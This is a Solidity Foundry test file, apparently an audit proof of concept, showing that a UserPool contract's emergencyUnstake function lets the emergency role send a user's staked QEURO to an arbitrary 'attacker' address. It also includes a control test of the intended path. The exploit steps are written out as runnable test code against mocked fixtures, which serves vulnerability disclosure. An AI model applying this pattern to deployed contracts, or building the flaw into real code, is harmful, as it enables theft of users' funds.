pragma solidity 0.8.24;

import {UserPoolTestSuite} from "../UserPool.t.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title EmergencyUnstakeRecipientPoC
 * @notice PoC: UserPool.emergencyUnstake sends staked QEURO to an arbitrary recipient.
 *         src/core/UserPool.sol:1817 only remaps recipient when it is address(0);
 *         any other address is paid via safeTransfer(recipient, amount).
 *         Contrast: stQEUROToken.emergencyWithdraw always pays the stakeholder.
 *
 * Run: forge test --match-contract EmergencyUnstakeRecipientPoC -vv
 */
contract EmergencyUnstakeRecipientPoC is UserPoolTestSuite {
    address public attacker = address(0xBEEF);

    function _stakeAsVictim() internal {
        vm.mockCall(
            mockQEURO,
            abi.encodeWithSelector(IERC20.balanceOf.selector, address(userPool)),
            abi.encode(STAKE_AMOUNT)
        );

        vm.prank(user1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory minOuts = new uint256[](1);
        amounts[0] = DEPOSIT_AMOUNT;
        minOuts[0] = 0;
        userPool.deposit(amounts, minOuts);

        vm.prank(user1);
        uint256[] memory stakeAmounts = new uint256[](1);
        stakeAmounts[0] = STAKE_AMOUNT;
        userPool.stake(stakeAmounts);

        (, uint256 staked, , , , , ) = userPool.getUserInfo(user1);
        assertEq(staked, STAKE_AMOUNT, "victim should be staked");
    }

    /// @notice Vulnerable path: non-zero recipient receives the victim's stake.
    function test_PoC_EmergencyUnstake_PaysArbitraryRecipient() public {
        _stakeAsVictim();

        // Pool pays attacker, not the stakeholder.
        vm.expectCall(
            mockQEURO,
            abi.encodeCall(IERC20.transfer, (attacker, STAKE_AMOUNT)),
            1
        );
        // And never pays the stakeholder.
        vm.expectCall(
            mockQEURO,
            abi.encodeCall(IERC20.transfer, (user1, STAKE_AMOUNT)),
            0
        );

        vm.prank(emergency);
        userPool.emergencyUnstake(user1, attacker);

        (, uint256 afterStake, , , , , ) = userPool.getUserInfo(user1);
        assertEq(afterStake, 0, "victim stake wiped");
        assertEq(userPool.totalStakes(), 0, "pool total wiped");
    }

    /// @notice Control: recipient == address(0) pays the stakeholder (intended path).
    function test_PoC_EmergencyUnstake_ZeroRecipient_PaysUser() public {
        _stakeAsVictim();

        vm.expectCall(
            mockQEURO,
            abi.encodeCall(IERC20.transfer, (user1, STAKE_AMOUNT)),
            1
        );

        vm.prank(emergency);
        userPool.emergencyUnstake(user1, address(0));

        (, uint256 afterStake, , , , , ) = userPool.getUserInfo(user1);
        assertEq(afterStake, 0, "victim stake cleared");
    }
}

